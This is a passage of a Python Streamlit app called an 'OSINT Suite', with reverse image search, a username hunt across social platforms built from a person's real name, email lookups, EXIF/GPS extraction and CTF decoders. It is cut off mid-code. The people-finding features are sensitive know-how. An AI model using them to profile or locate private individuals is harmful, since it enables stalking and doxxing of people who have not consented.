#!/usr/bin/env python3
"""OSINT Suite — Run: streamlit run osint_suite.py"""

import sys, os, io, re, math, time, socket, types, base64
import hashlib, urllib.parse, string, random
from collections import Counter
from datetime import datetime

import requests
import streamlit as st
from PIL import Image, ExifTags

try:
    import dns.resolver
    HAS_DNS = True
except ImportError:
    HAS_DNS = False

if "pkg_resources" not in sys.modules:
    import types as _t
    _m = _t.ModuleType("pkg_resources")
    _m.resource_filename = lambda p, r: os.path.join("/tmp", r)
    sys.modules["pkg_resources"] = _m

st.set_page_config(page_title="OSINT Suite", page_icon="🔬", layout="wide", initial_sidebar_state="collapsed")

st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Space+Grotesk:wght@300;400;500;600;700&display=swap');
*{box-sizing:border-box;margin:0;padding:0}

/* ── Background ── */
.stApp{
  background:#020810;
  background-image:
    radial-gradient(ellipse 80% 50% at 20% 5%, rgba(0,180,255,.10) 0%, transparent 60%),
    radial-gradient(ellipse 60% 60% at 80% 90%, rgba(100,0,255,.09) 0%, transparent 60%),
    radial-gradient(ellipse 40% 40% at 60% 40%, rgba(0,255,180,.04) 0%, transparent 50%);
  min-height:100vh;
}

/* ── Animated scan-line grid ── */
.stApp::before{
  content:'';
  position:fixed;top:0;left:0;right:0;bottom:0;
  background-image:
    linear-gradient(rgba(0,195,255,.03) 1px, transparent 1px),
    linear-gradient(90deg, rgba(0,195,255,.03) 1px, transparent 1px);
  background-size:40px 40px;
  pointer-events:none;
  z-index:0;
}

body,.stApp,p,span,div,label{font-family:'Space Grotesk',sans-serif!important;color:#c0d8ee}
h1,h2,h3,h4{font-family:'Share Tech Mono',monospace!important}

/* ── Hero banner ── */
.hero{
  text-align:center;
  padding:2.2rem 1rem 1rem;
  position:relative;
}
.hero-logo{
  font-size:4rem;
  filter:drop-shadow(0 0 24px rgba(0,195,255,.6)) drop-shadow(0 0 48px rgba(0,195,255,.3));
  animation:float 4s ease-in-out infinite;
  display:block;
  margin-bottom:.6rem;
}
.hero-title{
  font-family:'Share Tech Mono',monospace!important;
  font-size:2.4rem;font-weight:800;
  background:linear-gradient(135deg,#ffffff 0%,#00ddff 45%,#9b72ff 100%);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  letter-spacing:2px;
  text-transform:uppercase;
}
.hero-sub{
  color:#3d6070;font-size:.8rem;margin-top:.5rem;letter-spacing:1px;
}
.hero-badges{
  display:flex;justify-content:center;gap:.5rem;flex-wrap:wrap;margin-top:.9rem;
}
.hbadge{
  background:rgba(0,195,255,.07);
  border:1px solid rgba(0,195,255,.2);
  border-radius:30px;padding:3px 12px;
  font-size:.7rem;color:#5fc8e8;
  letter-spacing:.5px;
}

/* ── Glass cards ── */
.glass{
  background:linear-gradient(140deg,rgba(255,255,255,.07),rgba(255,255,255,.02));
  backdrop-filter:blur(24px) saturate(180%);
  border-radius:20px;
  border:1px solid rgba(255,255,255,.09);
  box-shadow:0 8px 40px rgba(0,0,0,.5), inset 0 1px 0 rgba(255,255,255,.06);
  padding:1.3rem 1.5rem;margin:.6rem 0;
}

/* ── Callout boxes ── */
.tip{background:rgba(0,255,160,.05);border-left:3px solid #00ffaa;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0 .9rem;font-size:.875rem;color:#8ae8c4}
.warn{background:rgba(255,170,0,.06);border-left:3px solid #ffaa00;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0;font-size:.875rem;color:#ffd070}
.danger{background:rgba(255,50,50,.07);border-left:3px solid #ff4444;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0;color:#ff9090}
.success-box{background:rgba(0,255,120,.07);border-left:3px solid #00ff88;border-radius:0 14px 14px 0;padding:.65rem 1.1rem;margin:.4rem 0;color:#80ffbb}

/* ── Result cards ── */
.rcard{background:rgba(0,195,255,.055);border:1px solid rgba(0,195,255,.14);border-radius:14px;padding:.7rem 1rem;margin:.35rem 0}
.rcard a{color:#00e0ff;text-decoration:none}
.badge-found{display:inline-block;background:rgba(0,255,130,.15);border:1px solid rgba(0,255,130,.5);border-radius:20px;padding:1px 9px;font-size:.72rem;color:#00ff88;margin-left:6px}

/* ── Stat pills ── */
.stat-row{display:flex;gap:10px;flex-wrap:wrap;margin:.7rem 0}
.stat-pill{background:rgba(0,195,255,.07);border:1px solid rgba(0,195,255,.18);border-radius:40px;padding:4px 13px;font-size:.8rem;color:#6dd8f8}

/* ── Section titles ── */
.sec-title{font-family:'Share Tech Mono',monospace;font-size:1.1rem;font-weight:700;color:#d8f0ff;margin:1rem 0 .6rem;display:flex;align-items:center;gap:8px}
.sec-title::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,rgba(0,195,255,.25),transparent);margin-left:8px}

/* ── Buttons ── */
.stButton>button{
  background:linear-gradient(135deg,#00c0ff,#004ecc)!important;
  border:none!important;border-radius:50px!important;
  padding:.52rem 1.4rem!important;font-weight:600!important;
  color:#fff!important;letter-spacing:.3px!important;
  box-shadow:0 4px 20px rgba(0,110,255,.4)!important;
  transition:all .2s!important;
}
.stButton>button:hover{transform:translateY(-2px)!important;box-shadow:0 8px 30px rgba(0,110,255,.65)!important}

/* ── Inputs ── */
.stTextInput input,.stTextArea textarea{
  background:rgba(8,18,32,.85)!important;
  border:1px solid rgba(0,195,255,.2)!important;
  border-radius:50px!important;
  color:#e2f2ff!important;
  font-family:'Share Tech Mono',monospace!important;
  font-size:.93rem!important;padding:.6rem 1.1rem!important;
}
.stTextArea textarea{border-radius:16px!important}

/* ── Tabs ── */
.stTabs [data-baseweb="tab-list"]{
  display:flex!important;justify-content:center!important;flex-wrap:wrap!important;
  background:rgba(4,12,24,.88)!important;backdrop-filter:blur(18px)!important;
  border-radius:60px!important;padding:6px 12px!important;gap:4px!important;
  border:1px solid rgba(0,195,255,.14)!important;
  margin:0 auto 1rem!important;width:fit-content!important;
}
.stTabs [data-baseweb="tab"]{font-family:'Space Grotesk',sans-serif!important;font-weight:500!important;font-size:.75rem!important;color:#607a92!important;padding:.4rem 1rem!important;border-radius:40px!important;white-space:nowrap!important}
.stTabs [aria-selected="true"]{background:linear-gradient(135deg,#00c0ff,#0050cc)!important;color:#fff!important;box-shadow:0 0 20px rgba(0,192,255,.45)!important}

pre,code{font-family:'Share Tech Mono',monospace!important;font-size:.83rem!important}
.stProgress>div>div>div{background:linear-gradient(90deg,#00c0ff,#00ff88)!important;border-radius:10px!important}
::-webkit-scrollbar{width:5px}::-webkit-scrollbar-track{background:rgba(0,0,0,.25)}::-webkit-scrollbar-thumb{background:rgba(0,195,255,.28);border-radius:3px}

@keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-8px)}}
@keyframes pulse-glow{0%,100%{box-shadow:0 0 20px rgba(0,195,255,.2)}50%{box-shadow:0 0 40px rgba(0,195,255,.5)}}

.ldot{display:inline-block;width:7px;height:7px;background:#00ff88;border-radius:50%;animation:blink 1.8s infinite;margin-right:5px;vertical-align:middle}

/* ── Feature grid on hero ── */
.feat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:.6rem;margin:1.2rem 0}
.feat-card{
  background:linear-gradient(140deg,rgba(0,195,255,.06),rgba(0,195,255,.02));
  border:1px solid rgba(0,195,255,.12);border-radius:16px;
  padding:.8rem 1rem;text-align:center;
  transition:all .2s;cursor:default;
}
.feat-card:hover{background:rgba(0,195,255,.1);border-color:rgba(0,195,255,.3);transform:translateY(-3px)}
.feat-icon{font-size:1.5rem;display:block;margin-bottom:.3rem}
.feat-label{font-size:.72rem;color:#5fc8e8;font-weight:600;letter-spacing:.5px;text-transform:uppercase}
</style>
""", unsafe_allow_html=True)

# ── Hero ────────────────────────────────────────────────────────────────
st.markdown("""
<div class="hero">
  <span class="hero-logo">🔬</span>
  <div class="hero-title">OSINT Suite</div>
  <div class="hero-sub"><span class="ldot"></span>open source intelligence · built by a dev who needed it · always free</div>
  <div class="hero-badges">
    <span class="hbadge">🔒 nothing stored</span>
    <span class="hbadge">⚡ live lookups</span>
    <span class="hbadge">🌐 14 tools in one</span>
    <span class="hbadge">🔓 no login needed</span>
  </div>
</div>

<div class="feat-grid">
  <div class="feat-card"><span class="feat-icon">🔍</span><span class="feat-label">Reverse Image</span></div>
  <div class="feat-card"><span class="feat-icon">👤</span><span class="feat-label">Username Hunt</span></div>
  <div class="feat-card"><span class="feat-icon">📧</span><span class="feat-label">Email Intel</span></div>
  <div class="feat-card"><span class="feat-icon">📁</span><span class="feat-label">File Metadata</span></div>
  <div class="feat-card"><span class="feat-icon">🎯</span><span class="feat-label">CTF Solver</span></div>
  <div class="feat-card"><span class="feat-icon">🔬</span><span class="feat-label">Deep File Scan</span></div>
  <div class="feat-card"><span class="feat-icon">🌐</span><span class="feat-label">Network Recon</span></div>
  <div class="feat-card"><span class="feat-icon">🔐</span><span class="feat-label">Password Tools</span></div>
</div>
""", unsafe_allow_html=True)

with st.sidebar:
    st.markdown("## 🔬 OSINT Suite")
    st.markdown("""
I built this because I got tired of jumping between 10 different tabs to do basic research. Everything's here now.

**Tools:**
- 🔍 Reverse Image Search
- 👤 Username / Social Hunt
- 📧 Email Intelligence
- 📁 File & Photo Metadata
- 🎯 CTF Solver (14 tools)
- 🔬 Deep File Analysis
- 🌐 Network & DNS Recon
- 🔐 Password Utilities
    """)
    st.caption("No login. No tracking. No BS.")

tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs([
    "🔍 Image", "👤 Social Media", "📧 Email", "📁 Metadata",
    "🎯 CTF", "🔬 Deep Scan", "🌐 Network", "🔐 Passwords"
])

def sec(txt): st.markdown(f"<div class='sec-title'>{txt}</div>", unsafe_allow_html=True)
def tip(msg): st.markdown(f"<div class='tip'>💡 {msg}</div>", unsafe_allow_html=True)
def warn(msg): st.markdown(f"<div class='warn'>⚠️ {msg}</div>", unsafe_allow_html=True)
def danger(msg): st.markdown(f"<div class='danger'>🚨 {msg}</div>", unsafe_allow_html=True)
def ok(msg): st.markdown(f"<div class='success-box'>✅ {msg}</div>", unsafe_allow_html=True)
def rcard(html): st.markdown(f"<div class='rcard'>{html}</div>", unsafe_allow_html=True)
def glass(html): st.markdown(f"<div class='glass'>{html}</div>", unsafe_allow_html=True)
def pills(pairs):
    inner = "".join(f"<span class='stat-pill'>{k}: <b>{v}</b></span>" for k, v in pairs)
    st.markdown(f"<div class='stat-row'>{inner}</div>", unsafe_allow_html=True)


# ── TAB 1: REVERSE IMAGE ────────────────────────────────────────────────
with tab1:
    sec("Reverse Image Search")
    st.markdown("""
Drop a photo here and I'll upload it to a temp host, then open it in Google, Yandex, Bing, and TinEye for you — all with one click instead of four.

**Good for:** finding out who someone is, checking if a photo is stolen or fake, tracing where an image originally came from.
""")
    tip("Cropped headshots work way better than full group photos. Clear, unedited photos give the best results.")

    img_file = st.file_uploader("Drop your image here", type=["jpg","png","jpeg","webp","gif"], key="rev_img")
    if img_file:
        img_bytes = img_file.getvalue()
        c1, c2 = st.columns([1, 2])
        with c1:
            st.image(img_bytes, width=210, caption=img_file.name)
        with c2:
            pills([("File", img_file.name), ("Size", f"{max(1,len(img_bytes)//1024)} KB")])
            with st.spinner("Uploading..."):
                try:
                    r = requests.post("https://tmpfiles.org/api/v1/upload",
                                      files={"file": (img_file.name, img_bytes)}, timeout=20)
                    if r.status_code == 200:
                        raw_url = r.json()["data"]["url"]
                        direct = raw_url.replace("tmpfiles.org/", "tmpfiles.org/dl/")
                        enc = urllib.parse.quote_plus(direct)
                        ok("Uploaded. Pick a search engine:")
                        engines = {
                            "Google Lens": f"https://lens.google.com/uploadbyurl?url={enc}",
                            "Yandex": f"https://yandex.com/images/search?rpt=imageview&url={enc}",
                            "Bing Visual": f"https://www.bing.com/images/search?view=detailv2&iss=sbi&q=imgurl:{enc}",
                            "TinEye": f"https://tineye.com/search?url={enc}",
                        }
                        cols = st.columns(2)
                        for i, (name, url) in enumerate(engines.items()):
                            with cols[i % 2]:
                                st.link_button(name, url, use_container_width=True)
                        st.caption(f"Direct link (expires ~60 min): {direct}")
                    else:
                        danger("Upload failed. Try a smaller JPEG.")
                except Exception as e:
                    danger(f"Upload error: {e}")


# ── TAB 2: SOCIAL MEDIA / USERNAME ─────────────────────────────────────
with tab2:
    sec("Social Media & Username Search")
    st.markdown("""
Type a username or a real name and this will check 20+ platforms at once — TikTok, Instagram, Twitter/X, GitHub, Reddit, YouTube, and more.

**Using a real name?** Switch to "Full name" mode and it'll automatically generate the most common username variations people use (like `johnsmith`, `john.smith`, `john_smith`, `itsjohn`, etc.) and check those too.

**Heads up:** TikTok and Instagram usually block automated checks. If you get no results, scroll down — there's a manual TikTok finder and direct links you can click yourself.
""")

    col_q, col_m = st.columns([3, 1])
    with col_q:
        u_query = st.text_input("Username or full name", placeholder="johndoe  or  John Doe", key="u_query")
    with col_m:
        u_mode = st.radio("Type", ["Username", "Full name"], key="u_mode")

    PLATFORMS = {
        "TikTok": "https://tiktok.com/@{}",
        "Instagram": "https://instagram.com/{}",
        "Twitter/X": "https://twitter.com/{}",
        "Facebook": "https://facebook.com/{}",
        "GitHub": "https://github.com/{}",
        "Reddit": "https://reddit.com/user/{}",
        "YouTube": "https://youtube.com/@{}",
        "Twitch": "https://twitch.tv/{}",
        "Snapchat": "https://snapchat.com/add/{}",
        "Telegram": "https://t.me/{}",
        "Pinterest": "https://pinterest.com/{}",
        "LinkedIn": "https://linkedin.com/in/{}",
        "Threads": "https://threads.net/@{}",
        "Medium": "https://medium.com/@{}",
        "SoundCloud": "https://soundcloud.com/{}",
        "Flickr": "https://flickr.com/people/{}",
        "Tumblr": "https://tumblr.com/{}",
        "DeviantArt": "https://deviantart.com/{}",
        "Spotify": "https://open.spotify.com/user/{}",
        "Steam": "https://steamcommunity.com/id/{}",
    }

    if st.button("🔍 Search All Platforms", use_container_width=True, key="hunt_go") and u_query:
        q = u_query.strip()
        cands = set()
        if u_mode == "Username":
            cands.add(q.lower().lstrip('@'))
        else:
            parts = q.lower().split()
            first = parts[0] if parts else q.lower()
            last = parts[-1] if len(parts) > 1 else ""
            cands.update([q.lower().replace(" ", ""), q.lower().replace(" ", "."), q.lower().replace(" ", "_")])
            if last:
                cands.update([f"{first}{last}", f"{first}.{last}", f"{first}_{last}",
                               f"{first[0]}{last}", f"{last}{first}", f"{first}{last}1",
                               f"its{first}", f"real{first}"])
        cands = list(cands)[:15]

        found_list = []
        pb = st.progress(0.0)
        stat = st.empty()
        total = len(cands) * len(PLATFORMS)
        done = 0

        for uname in cands:
            stat.markdown(f"<span class='ldot'></span>Checking **@{uname}**...", unsafe_allow_html=True)
            for plat, tmpl in PLATFORMS.items():
                url = tmpl.format(uname)
                try:
                    resp = requests.get(url, timeout=4,
                                        headers={"User-Agent": "Mozilla/5.0"}, allow_redirects=True)
                    if resp.status_code == 200:
                        body = resp.text.lower()
                        if not any(x in body for x in [
                            "not found","doesn't exist","page not found",
                            "user not found","couldn't find this account","sorry, this page"
                        ]):
                            found_list.append({"platform": plat, "username": uname, "url": url})
                except:
                    pass
                done += 1
                pb.progress(min(done / total, 0.99))

        pb.empty(); stat.empty()

        if found_list:
            st.success(f"Found {len(found_list)} profile(s)")
            for r in found_list:
                rcard(f"<b>{r['platform']}</b> <span class='badge-found'>FOUND</span><br>"
                      f"@{r['username']}<br><a href='{r['url']}' target='_blank'>{r['url']}</a>")
        else:
            warn("Nothing found automatically. Try the manual links below — some platforms block bots.")

        with st.expander("🔗 Open links manually (click to expand)"):
            tip("If the search above came up empty, open these yourself. Some platforms only show results when you visit directly.")
            for uname in list(cands)[:4]:
                st.markdown(f"**Checking: @{uname}**")
                mc = st.columns(5)
                quick = [("TikTok", f"https://tiktok.com/@{uname}"),
                         ("Instagram", f"https://instagram.com/{uname}"),
                         ("Twitter", f"https://twitter.com/{uname}"),
                         ("GitHub", f"https://github.com/{uname}"),
                         ("LinkedIn", f"https://linkedin.com/in/{uname}")]
                for i, (pn, pu) in enumerate(quick):
                    with mc[i]:
                        st.link_button(pn, pu, use_container_width=True)

    # ── TIKTOK FINDER ────────────────────────────────────────────────────
    st.markdown("---")
    sec("🎵 TikTok Finder")
    st.markdown("""
TikTok specifically blocks most bots, so the search above often misses it. This section generates every realistic username variation for that person and gives you clickable buttons to check each one directly.

Enter a name or known username, hit the button, and click whichever profiles look right.
""")
    tip("People on TikTok often go by something like `itsfirstname`, `realfirstname`, `firstlast`, or add numbers at the end. We generate all of those.")

    tt_query = st.text_input("Name or username to find on TikTok:", placeholder="Charlie D'Amelio  or  charlidamelio", key="tt_q")
    if st.button("🎵 Find on TikTok", use_container_width=True, key="tt_go") and tt_query:
        raw = tt_query.strip().lstrip('@').lower()
        parts = raw.split()
        f = parts[0] if parts else raw
        l = parts[-1] if len(parts) > 1 else ""
        tt_variants = list(dict.fromkeys(filter(None, [
            raw.replace(" ", ""),
            raw.replace(" ", "."),
            raw.replace(" ", "_"),
            f"{f}{l}" if l else "",
            f"{f}.{l}" if l else "",
            f"{f}_{l}" if l else "",
            f"{f[0]}{l}" if l else "",
            f"its{f}",
            f"real{f}",
            f"{f}official",
            f"its{f}{l}" if l else "",
            f"real{f}{l}" if l else "",
            f"{f}{l}official" if l else "",
            f"{f}{l}1" if l else "",
            f"{f}{l}2" if l else "",
        ])))

        st.markdown(f"**Generated {len(tt_variants)} TikTok variants — click any to open:**")
        cols = st.columns(3)
        for i, v in enumerate(tt_variants):
            with cols[i % 3]:
                st.link_button(f"@{v}", f"https://tiktok.com/@{v}", use_container_width=True)

        st.markdown("**Broader search:**")
        bc1, bc2 = st.columns(2)
        bc1.link_button("TikTok Search", f"https://tiktok.com/search/user?q={urllib.parse.quote(tt_query)}", use_container_width=True)
        bc2.link_button("Google: site:tiktok.com", f"https://google.com/search?q=site:tiktok.com+{urllib.parse.quote(tt_query)}", use_container_width=True)


# ── TAB 3: EMAIL ────────────────────────────────────────────────────────
with tab3:
    sec("Email Intelligence")
    st.markdown("""
Enter an email and I'll do three things:

1. **Check for a linked profile picture** (Gravatar) — a lot of people have one without realizing it
2. **Look up its reputation** — is this a real address or a known spam/throwaway account?
3. **Link you to breach check** — see if this email showed up in any hacked databases

A "data breach" is when a site gets hacked and their user emails/passwords leak online. HaveIBeenPwned tracks those leaks.
""")
    tip("Works best on real personal or work emails. Throwaway services like guerrillamail will almost always come back low reputation.")

    email_in = st.text_input("Email address", placeholder="someone@example.com", key="email_in")
    if st.button("Look Up", use_container_width=True, key="email_go") and email_in:
        em = email_in.strip().lower()
        if not re.match(r"^[^@\s]+@[^@\s]+\.[^@\s]+$", em):
            danger("That doesn't look like a valid email. Try: name@domain.com")
        else:
            local, domain = em.split("@", 1)
            md5h = hashlib.md5(em.encode()).hexdigest()
            glass(f"<b>Email:</b> {em}<br><b>Domain:</b> {domain}<br><b>MD5:</b> <code>{md5h}</code>")

            sec("Profile Picture (Gravatar)")
            try:
                grav = requests.get(f"https://www.gravatar.com/avatar/{md5h}?d=404&s=120", timeout=7)
                if grav.status_code == 200:
                    st.image(f"https://www.gravatar.com/avatar/{md5h}?s=100", width=100)
                    ok("There's a Gravatar profile linked to this email.")
                else:
                    st.info("No Gravatar found for this address.")
            except:
                st.info("Couldn't reach Gravatar right now.")

            sec("Data Breach Check")
            st.markdown("Click below to check HaveIBeenPwned — it's free and shows which breaches this email appeared in.")
            st.link_button("Check HaveIBeenPwned →", f"https://haveibeenpwned.com/account/{urllib.parse.quote(em)}", use_container_width=True)

            sec("Reputation Score")
            try:
                erep = requests.get(f"https://emailrep.io/{urllib.parse.quote(em)}",
                                    headers={"User-Agent": "osint-suite/1.0"}, timeout=8)
                if erep.status_code == 200:
                    d = erep.json()
                    rep = d.get("reputation", "unknown")
                    sus = d.get("suspicious", False)
                    label = {"high": "🟢 Trusted", "medium": "🟡 Moderate", "low": "🔴 Suspicious"}.get(rep, "⚪ Unknown")
                    st.markdown(f"**Reputation:** {label}")
                    if sus:
                        warn("This address is flagged as suspicious by emailrep.io")
                    else:
                        ok("Not flagged as suspicious.")
                else:
                    st.info("EmailRep rate limited — try again in a minute.")
            except:
                pass


# ── TAB 4: METADATA ─────────────────────────────────────────────────────
with tab4:
    sec("File Metadata & EXIF")
    st.markdown("""
Every photo your phone takes secretly stores a bunch of info inside the file — the exact GPS location, what device took it, the date and time, even what software edited it. This is called EXIF data.

People have been caught by law enforcement and doxxed because they shared photos without stripping this data first.

Upload a photo here and I'll pull all of it out for you.
""")
    tip("Instagram, Twitter, and most social media strip EXIF when you upload. But photos sent directly via iMessage, email, or file share usually still have everything.")

    meta_file = st.file_uploader("Upload an image", type=["jpg","jpeg","png","tiff","webp"], key="meta_f")
    if meta_file:
        try:
            img = Image.open(io.BytesIO(meta_file.getvalue()))
            st.image(img, width=250)
            pills([("Format", img.format or "?"), ("Size", f"{img.size[0]}×{img.size[1]}"), ("Mode", img.mode)])
            exif = img._getexif()
            if exif:
                human = {ExifTags.TAGS.get(k, str(k)): str(v)[:200] for k, v in exif.items()}
                if any("GPS" in k for k in human):
                    danger("GPS coordinates found in this photo! It contains location data.")
                else:
                    ok("No GPS data found.")
                with st.expander("📷 All EXIF fields (click to expand)"):
                    st.json(human)
            else:
                st.info("No EXIF data found — this image has been cleaned or was never tagged.")
        except Exception as e:
            danger(f"Couldn't read this file: {e}")


# ── TAB 5: CTF SOLVER ──────────────────────────────────────────────────
with tab5:
    sec("CTF Solver")

    with st.expander("🆕 Never done a CTF before? Open this first.", expanded=False):
        st.markdown("""
**CTF = Capture The Flag.** You get a puzzle, you solve it, you find a hidden string called a flag. Usually looks like `CTF{s0mething_here}` or `flag{answer}`.

You don't need to be a hacker to start. A huge chunk of beginner challenges are just about recognizing an encoding and using the right decoder — which is exactly what this page does.

---

**Step 1: Figure out what you have**

| What it looks like | What it probably is | Use this tool |
|---|---|---|
| `aGVsbG8=` — mixed letters, ends in `=` | Base64 | 🔤 Multi-Decoder |
| `68656c6c6f` — only 0-9 and a-f | Hex | 🔤 Multi-Decoder |
| `01101000 01101001` — only 0s and 1s | Binary | 🔤 Multi-Decoder |
| `Uryyb Jbeyq` — looks like English but wrong | ROT13 / Caesar | 🔄 Caesar Brute Force |
| `.... . .-.. .-.. ---` — dots and dashes | Morse code | 📡 Morse Decoder |
| `5f4dcc3b...` — 32 chars, hex | MD5 hash | #️⃣ Hash Identifier |
| `eyJhbG...` — starts with `eyJ` | JWT token | 🔑 JWT Decoder |
| `JBSWY3DP...` — all caps, 2-7 only | Base32 | 📦 Base32 |
| `Wkdv lv d whvw` — shifted letters | Vigenère / Caesar | 🔄 Caesar or 🔑 Vigenère |
| Image file that seems too large | Steganography | 🖼️ Stego |

---

**Step 2: Still stuck?**

- Paste whatever you have into **Multi-Decoder → Try Everything** first
- If it's 32 chars of hex → it's probably an MD5. Paste it in **Hash Identifier** then try **CrackStation**
- If it looks like English but slightly off → **Caesar Brute Force** will show all 25 shifts
- Google the exact string — CTF writeups are public and people post solutions

---

**Free places to practice:**
- [PicoCTF](https://picoctf.org) — best for beginners, totally free, permanent challenges
- [Hack The Box](https://hackthebox.com) — harder, but great for leveling up
- [CTFtime.org](https://ctftime.org) — calendar of every upcoming CTF
        """)

    tool = st.selectbox("Pick a tool:", [
        "🔤 Multi-Decoder",
        "#️⃣ Hash Identifier & Cracker",
        "🔄 Caesar / ROT Brute Force",
        "🔑 Vigenère Cipher",
        "🔁 Atbash Decoder",
        "🖼️ Steganography",
        "💉 Web Payloads",
        "🔬 Forensics & PCAP",
        "🔢 Number Base Converter",
        "🔐 XOR Decoder",
        "📡 Morse Code Decoder",
        "🔑 JWT Decoder",
        "🌐 URL Encoder / Decoder",
        "📦 Base32 Decoder",
    ], key="ctf_tool")

    # ── MULTI DECODER ──────────────────────────────────────────────────
    if tool == "🔤 Multi-Decoder":
        st.markdown("""
Paste whatever encoded text you have and hit a button. If you have no idea what it is, use **Try Everything** — it'll run every decoder and show you what actually produces readable text.

**Not sure what you're looking at?**
- Ends with `=` or `==` → Base64
- Only letters 0-9 and a-f → Hex
- Only 0s and 1s → Binary
- Looks like English but the letters are wrong → ROT13
- Has `%20` or `%3D` in it → URL encoded
        """)
        cipher = st.text_area("Paste your encoded text:", height=100,
                               placeholder="dGhpcyBpcyBhIHRlc3Q=   or   Uryyb Jbeyq   or   48656c6c6f", key="ctf_cipher")

        c1, c2, c3, c4, c5, c6 = st.columns(6)

        def b64_decode(s):
            s = s.strip()
            pad = s + "=" * ((4 - len(s) % 4) % 4)
            return base64.b64decode(pad).decode("utf-8", errors="replace")

        def hex_decode(s):
            c = re.sub(r'[^0-9a-fA-F]', '', s)
            if len(c) % 2 != 0:
                c = c[:-1]
            return bytes.fromhex(c).decode("utf-8", errors="replace")

        def bin_decode(s):
            bits = re.sub(r'[^01]', '', s)
            if len(bits) % 8 != 0:
                bits = bits[:-(len(bits) % 8)]
            if not bits:
                raise ValueError("empty")
            return "".join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))

        def rot13(s):
            return s.translate(str.maketrans(
                'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))

        with c1:
            if st.button("Try Everything", use_container_width=True) and cipher:
                found_any = False
                for label, fn in [("Base64", b64_decode), ("Hex", hex_decode),
                                   ("Binary", bin_decode), ("ROT13", rot13)]:
                    try:
                        r = fn(cipher)
                        if r and any(c.isprintable() for c in r):
                            ok(f"**{label}** → {r}")
                            found_any = True
                    except: pass
                try:
                    ok(f"**URL decode** → {urllib.parse.unquote(cipher.strip())}")
                    found_any = True
                except: pass
                if not found_any:
                    warn("Nothing decoded cleanly. Try a specific decoder or check if the text is correct.")

        with c2:
            if st.button("Base64", use_container_width=True) and cipher:
                try: ok(b64_decode(cipher))
                except: danger("Not valid Base64. Check the text and try again.")

        with c3:
            if st.button("ROT13", use_container_width=True) and cipher:
                ok(rot13(cipher))

        with c4:
            if st.button("Hex", use_container_width=True) and cipher:
                try: ok(hex_decode(cipher))
                except: danger("Not valid hex. Should only contain 0-9 and a-f.")

        with c5:
            if st.button("Binary", use_container_width=True) and cipher:
                try: ok(bin_decode(cipher))
                except Exception as e: danger(f"Not valid binary: {e}")

        with c6:
            if st.button("URL Decode", use_container_width=True) and cipher:
                ok(urllib.parse.unquote(cipher.strip()))

        # Base64 encode too
        st.markdown("---")
        st.markdown("**Need to encode something?**")
        enc_in = st.text_input("Text to Base64-encode:", key="b64_enc")
        if enc_in:
            ok(f"Base64: `{base64.b64encode(enc_in.encode()).decode()}`")

    # ── CAESAR / ROT BRUTE FORCE ────────────────────────────────────────
    elif tool == "🔄 Caesar / ROT Brute Force":
        st.markdown("""
Caesar cipher just shifts every letter by a fixed number. ROT13 is Caesar with shift 13 — the most common one in CTFs.

If you don't know the shift, paste the text below and you'll see all 25 possible results. The right answer is the one that looks like English (or whatever language the flag is in).
        """)
        caesar_in = st.text_area("Paste encoded text:", height=80, key="caesar_in")
        if caesar_in:
            st.markdown("**All 25 shifts — one of these is your answer:**")
            for shift in range(1, 26):
                result = ""
                for ch in caesar_in:
                    if ch.isalpha():
                        base = ord('A') if ch.isupper() else ord('a')
                        result += chr((ord(ch) - base + shift) % 26 + base)
                    else:
                        result += ch
                st.text(f"ROT{shift:2d}: {result[:120]}")

    # ── VIGENÈRE CIPHER ────────────────────────────────────────────────
    elif tool == "🔑 Vigenère Cipher":
        st.markdown("""
Vigenère is like Caesar but uses a keyword instead of a single number. Each letter in your text is shifted by the corresponding letter in the key.

**Example:** key = `KEY`, message = `HELLO`
- H shifted by K (10) = R
- E shifted by E (4) = I
- L shifted by Y (24) = J
- L shifted by K (10) = V
- O shifted by E (4) = S
→ `RIJVS`

**In CTFs** the key is usually somewhere in the challenge description or filename. Try common words if you don't have it.
        """)
        vig_text = st.text_area("Ciphertext:", height=80, key="vig_text")
        vig_key = st.text_input("Key (letters only):", placeholder="KEY  or  SECRET  or  FLAG", key="vig_key")
        c1, c2 = st.columns(2)
        if vig_text and vig_key:
            key_clean = re.sub(r'[^a-zA-Z]', '', vig_key).upper()
            if not key_clean:
                danger("Key must contain at least one letter.")
            else:
                with c1:
                    if st.button("Decrypt", use_container_width=True):
                        result, ki = [], 0
                        for ch in vig_text:
                            if ch.isalpha():
                                shift = ord(key_clean[ki % len(key_clean)]) - ord('A')
                                base = ord('A') if ch.isupper() else ord('a')
                                result.append(chr((ord(ch) - base - shift) % 26 + base))
                                ki += 1
                            else:
                                result.append(ch)
                        ok(f"**Decrypted:** {''.join(result)}")
                with c2:
                    if st.button("Encrypt", use_container_width=True):
                        result, ki = [], 0
                        for ch in vig_text:
                            if ch.isalpha():
                                shift = ord(key_clean[ki % len(key_clean)]) - ord('A')
                                base = ord('A') if ch.isupper() else ord('a')
                                result.append(chr((ord(ch) - base + shift) % 26 + base))
                                ki += 1
                            else:
                                result.append(ch)
                        ok(f"**Encrypted:** {''.join(result)}")

    # ── ATBASH ─────────────────────────────────────────────────────────
    elif tool == "🔁 Atbash Decoder":
        st.markdown("""
Atbash is one of the oldest ciphers — it just reverses the alphabet. A↔Z, B↔Y, C↔X, and so on. It's its own inverse, so encoding and decoding are the same operation.

`HELLO` → `SVOOL` → `HELLO`

Shows up fairly often in beginner CTFs, especially ones with a historical or ancient theme.
        """)
        atbash_in = st.text_area("Text to encode/decode:", height=80, placeholder="HELLO  or  SVOOL", key="atbash_in")
        if atbash_in:
            result = ""
            for ch in atbash_in:
                if ch.isalpha():
                    base = ord('A') if ch.isupper() else ord('a')
                    result += chr(base + 25 - (ord(ch) - base))
                else:
